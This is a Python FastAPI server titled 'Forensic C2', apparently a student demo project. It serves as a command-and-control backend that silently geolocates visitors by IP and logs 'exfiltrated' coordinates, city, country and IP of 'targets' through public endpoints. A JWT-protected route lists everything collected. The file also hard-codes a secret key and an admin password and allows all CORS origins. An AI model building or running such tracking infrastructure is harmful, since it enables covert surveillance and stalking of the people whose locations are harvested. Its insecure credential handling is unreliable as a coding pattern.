import uvicorn
from fastapi import FastAPI, Request, HTTPException, Depends
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
from datetime import datetime, timedelta
import httpx
import sqlite3
import jwt  # Needs: pip install PyJWT

app = FastAPI(title="Forensic C2 - Secure Edition")

# Security Configuration
SECRET_KEY = "FORENSIC_SECRET_77"  # Change this for production
ALGORITHM = "HS256"
ADMIN_USER = "admin"
ADMIN_PASS = "cyber123"  # Password for the viva demo

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)

DB_PATH = "forensics.db"


def init_db():
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS targets (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            latitude REAL,
            longitude REAL,
            method TEXT,
            accuracy TEXT,
            city TEXT,
            country TEXT,
            ip TEXT,
            timestamp TEXT
        )
    """)
    conn.commit()
    conn.close()


init_db()


# --- Security Schemas ---
class LoginRequest(BaseModel):
    username: str
    password: str


class TrackingData(BaseModel):
    latitude: float
    longitude: float
    method: str
    accuracy: str
    city: str = "Unknown"
    country: str = "Unknown"
    ip: str = "Unknown"


# --- Auth Helper ---
def verify_token(request: Request):
    auth_header = request.headers.get("Authorization")
    if not auth_header or not auth_header.startswith("Bearer "):
        raise HTTPException(status_code=401, detail="Unauthorized: Missing Token")

    token = auth_header.split(" ")[1]
    try:
        payload = jwt.decode(token, SECRET_KEY, algorithms=[ALGORITHM])
        return payload
    except jwt.ExpiredSignatureError:
        raise HTTPException(status_code=401, detail="Token Expired")
    except jwt.InvalidTokenError:
        raise HTTPException(status_code=401, detail="Invalid Token")


# --- Routes ---


@app.post("/login")
async def login(req: LoginRequest):
    """Authenticates admin and issues a JWT."""
    if req.username == ADMIN_USER and req.password == ADMIN_PASS:
        expiration = datetime.utcnow() + timedelta(hours=2)
        token = jwt.encode(
            {"sub": req.username, "exp": expiration}, SECRET_KEY, algorithm=ALGORITHM
        )
        return {"access_token": token, "token_type": "bearer"}
    raise HTTPException(status_code=401, detail="Invalid Credentials")


@app.get("/track-ip")
async def track_ip(request: Request):
    """Passive tracking endpoint (Public)."""
    client_ip = request.headers.get("x-forwarded-for") or request.client.host
    api_url = (
        f"http://ip-api.com/json/{client_ip}"
        if client_ip not in ["127.0.0.1", "::1"]
        else "http://ip-api.com/json/"
    )
    try:
        async with httpx.AsyncClient(timeout=5.0) as client:
            response = await client.get(api_url)
            return response.json()
    except:
        return {"status": "fail", "query": client_ip, "lat": 0, "lon": 0}


@app.post("/log-target")
async def log_target(data: TrackingData):
    """Records exfiltrated data (Public)."""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute(
        """
        INSERT INTO targets (latitude, longitude, method, accuracy, city, country, ip, timestamp)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?)
    """,
        (
            data.latitude,
            data.longitude,
            data.method,
            data.accuracy,
            data.city,
            data.country,
            data.ip,
            timestamp,
        ),
    )
    conn.commit()
    conn.close()
    return {"status": "success"}


@app.get("/get-all-targets")
async def get_all_targets(user=Depends(verify_token)):
    """Protected endpoint: Returns tracking logs."""
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM targets ORDER BY timestamp DESC")
    rows = cursor.fetchall()
    conn.close()
    return [dict(row) for row in rows]


if __name__ == "__main__":
    uvicorn.run(app, host="127.0.0.1", port=8000)
